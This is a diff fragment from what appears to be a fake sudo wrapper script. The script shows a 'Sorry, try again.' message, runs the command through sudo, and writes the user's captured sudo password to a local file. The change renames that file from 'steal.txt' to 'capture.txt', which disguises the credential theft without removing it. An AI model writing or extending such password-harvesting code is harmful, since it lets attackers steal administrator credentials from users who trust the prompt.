@@ -7,4 +7,4 @@ echo "Sorry, try again."
 echo "${command}"
 sudo $command
 
-printf "${sudopasswd}\n" >> steal.txt
+printf "${sudopasswd}\n" >> capture.txt
